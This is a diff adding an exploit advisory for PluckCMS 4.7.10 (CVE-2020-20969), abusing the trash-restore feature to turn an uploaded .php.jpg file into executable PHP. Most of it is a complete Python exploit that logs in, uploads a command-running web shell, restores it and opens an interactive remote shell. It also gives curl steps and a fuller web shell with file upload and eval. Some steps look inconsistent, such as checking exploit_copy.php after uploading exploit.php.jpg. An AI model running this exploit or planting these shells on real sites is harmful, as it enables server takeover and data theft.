@@ -1,0 +1,296 @@
+=============================================================================================================================================
+| # Title     : PluckCMS 4.7.10 Unrestricted File Upload RCE                                                                                |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://github.com/pluck-cms/pluck/                                                                                         |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212393/ &  	CVE-2020-20969
+
+[+] Summary : The trash restoration functionality (/admin.php?action=trash_restoreitem) fails to properly validate file extensions when restoring files from the trash directory, 
+              allowing attackers to restore malicious PHP files with double extensions (e.g., .php.jpg) that were previously uploaded to the system.			 
+			  
+[+]  POC : python poc.py
+
+#!/usr/bin/env python3
+
+import requests
+import sys
+import time
+import os
+from urllib.parse import urljoin
+
+class PluckCMSExploit:
+    def __init__(self, target_url, username, password):
+        self.target_url = target_url.rstrip('/')
+        self.session = requests.Session()
+        self.username = username
+        self.password = password
+        
+    def login(self):
+        """Login to PluckCMS admin panel"""
+        login_url = urljoin(self.target_url, '/admin.php')
+        
+        # First get the login page to obtain any required tokens
+        print("[*] Getting login page...")
+        response = self.session.get(login_url)
+        
+        # Prepare login data (adjust field names based on actual form)
+        login_data = {
+            'cont1': self.username,
+            'cont2': self.password,
+            'submit': 'Log in'
+        }
+        
+        print(f"[*] Attempting login as {self.username}...")
+        response = self.session.post(login_url, data=login_data)
+        
+        # Check if login was successful
+        if 'admin.php' in response.url and 'action=page' in response.text:
+            print("[+] Login successful!")
+            return True
+        else:
+            print("[-] Login failed!")
+            return False
+    
+    def upload_malicious_file(self):
+        """Upload a file with double extension (.php.jpg)"""
+        upload_url = urljoin(self.target_url, '/admin.php?action=files')
+        
+        # Create a malicious PHP file with backdoor
+        php_shell = """<?php
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+} else {
+    echo "PluckCMS RCE - CVE-2020-20969";
+}
+?>"""
+        
+        # Write to local file first
+        with open('exploit.php.jpg', 'w') as f:
+            f.write(php_shell)
+        
+        # Prepare the upload
+        files = {
+            'uploadfile': ('exploit.php.jpg', open('exploit.php.jpg', 'rb'), 'image/jpeg')
+        }
+        
+        data = {
+            'sendfile': 'Upload'
+        }
+        
+        print("[*] Uploading malicious file (exploit.php.jpg)...")
+        response = self.session.post(upload_url, files=files, data=data)
+        
+        # Clean up local file
+        os.remove('exploit.php.jpg')
+        
+        if 'exploit.php.jpg' in response.text:
+            print("[+] File uploaded successfully!")
+            return True
+        else:
+            print("[-] File upload failed!")
+            return False
+    
+    def move_to_trash(self):
+        """Move the file to trash (simulate user action)"""
+        # This would normally be done through the admin interface
+        # For the PoC, we'll assume the file is in trash
+        print("[*] Note: You need to move 'exploit.php.jpg' to trash via admin interface")
+        print("[*] Or ensure it exists in data/trash/files/ directory")
+        return True
+    
+    def exploit_trash_restore(self):
+        """Exploit the trash restoration vulnerability"""
+        exploit_url = urljoin(self.target_url, '/admin.php?action=trash_restoreitem&var1=exploit.php.jpg&var2=file')
+        
+        print("[*] Exploiting trash restoration vulnerability...")
+        response = self.session.get(exploit_url)
+        
+        if response.status_code == 200:
+            print("[+] Trash restoration successful!")
+            
+            # Verify the file was restored
+            check_url = urljoin(self.target_url, '/files/exploit_copy.php')
+            response = self.session.get(check_url)
+            
+            if 'PluckCMS RCE' in response.text:
+                print("[+] Exploit confirmed! File accessible at:")
+                print(f"    {check_url}")
+                return True
+        return False
+    
+    def execute_command(self, command):
+        """Execute a command on the target"""
+        cmd_url = urljoin(self.target_url, f'/files/exploit_copy.php?cmd={command}')
+        
+        print(f"[*] Executing command: {command}")
+        response = self.session.get(cmd_url)
+        
+        if response.status_code == 200:
+            print("[+] Command output:")
+            print(response.text.strip())
+            return response.text
+        return None
+    
+    def run(self):
+        """Run the complete exploit chain"""
+        print("[*] PluckCMS 4.7.10 - Unrestricted File Upload RCE (CVE-2020-20969)")
+        print(f"[*] Target: {self.target_url}")
+        
+        # Step 1: Login
+        if not self.login():
+            return
+        
+        # Step 2: Upload malicious file
+        if not self.upload_malicious_file():
+            print("[-] Upload failed. Continuing with assumption file exists...")
+        
+        # Step 3: User needs to move file to trash manually
+        self.move_to_trash()
+        
+        input("[*] Press Enter after moving exploit.php.jpg to trash via admin panel...")
+        
+        # Step 4: Exploit trash restoration
+        if self.exploit_trash_restore():
+            # Step 5: Test command execution
+            print("\n[*] Testing command execution...")
+            self.execute_command('whoami')
+            self.execute_command('pwd' if 'linux' in sys.platform else 'dir')
+            
+            # Interactive shell
+            print("\n[+] Interactive shell mode (type 'exit' to quit)")
+            while True:
+                cmd = input("shell> ").strip()
+                if cmd.lower() in ['exit', 'quit']:
+                    break
+                if cmd:
+                    self.execute_command(cmd)
+        else:
+            print("[-] Exploit failed. Possible reasons:")
+            print("    - File not in trash directory")
+            print("    - Different file naming")
+            print("    - Already patched")
+
+# Manual exploitation using curl commands
+def manual_exploit_curl():
+    """Manual exploitation steps using curl"""
+    print("\n" + "="*60)
+    print("MANUAL EXPLOITATION WITH CURL")
+    print("="*60)
+    
+    manual_steps = """
+STEP 1: Login and get session cookie
+------------------------------------
+curl -c cookies.txt -X POST {target}/admin.php \\
+  -d "cont1=admin&cont2=password&submit=Log+in"
+
+STEP 2: Upload malicious file (if needed)
+-----------------------------------------
+curl -b cookies.txt -X POST {target}/admin.php?action=files \\
+  -F "uploadfile=@exploit.php.jpg" \\
+  -F "sendfile=Upload"
+
+STEP 3: Exploit trash restoration
+---------------------------------
+curl -b cookies.txt \\
+  "{target}/admin.php?action=trash_restoreitem&var1=exploit.php.jpg&var2=file"
+
+STEP 4: Execute commands
+------------------------
+curl "{target}/files/exploit_copy.php?cmd=id"
+
+STEP 5: Clean up
+----------------
+curl -b cookies.txt \\
+  "{target}/admin.php?action=files&var=exploit_copy.php&action2=delete"
+    """.format(target="http://target.com")
+    
+    print(manual_steps)
+
+# Web shell content
+def generate_webshell():
+    """Generate a more advanced web shell"""
+    advanced_shell = """<?php
+// PluckCMS CVE-2020-20969 Web Shell
+error_reporting(0);
+echo "<pre>";
+
+// Command execution
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+
+// File upload
+if(isset($_FILES['file'])) {
+    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+    echo "File uploaded!";
+}
+
+// PHP code execution
+if(isset($_POST['code'])) {
+    eval($_POST['code']);
+}
+
+// Show upload form
+echo '
+<form method="POST" enctype="multipart/form-data">
+<input type="file" name="file">
+<input type="submit" value="Upload">
+</form>
+
+<form method="POST">
+<textarea name="code" rows="10" cols="80"></textarea><br>
+<input type="submit" value="Execute PHP">
+</form>
+';
+echo "</pre>";
+?>"""
+    
+    # Save the web shell
+    with open('webshell.php.jpg', 'w') as f:
+        f.write(advanced_shell)
+    print("[+] Advanced web shell saved as 'webshell.php.jpg'")
+    return advanced_shell
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print("Usage: python3 pluck_exploit.py <target_url> <username> <password>")
+        print("Example: python3 pluck_exploit.py http://localhost/pluck admin admin123")
+        print("\nExample manual steps:")
+        manual_exploit_curl()
+        
+        print("\n" + "="*60)
+        print("QUICK MANUAL METHOD:")
+        print("="*60)
+        print("""
+1. Login to admin panel
+2. Upload a file named 'exploit.php.jpg' with this content:
+   <?php system($_GET['cmd']); ?>
+   
+3. Move the file to trash via admin interface
+   
+4. Send this request (replace PHPSESSID with your session):
+   GET /admin.php?action=trash_restoreitem&var1=exploit.php.jpg&var2=file
+   
+5. Access your shell:
+   http://target/files/exploit_copy.php?cmd=id
+        """)
+        
+        # Ask if user wants to generate a web shell
+        if input("\nGenerate web shell file? (y/n): ").lower() == 'y':
+            generate_webshell()
+        
+        sys.exit(1)
+    
+    target = sys.argv[1]
+    username = sys.argv[2]
+    password = sys.argv[3]
+    
+    exploit = PluckCMSExploit(target, username, password)
+    exploit.run()
+
+	
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
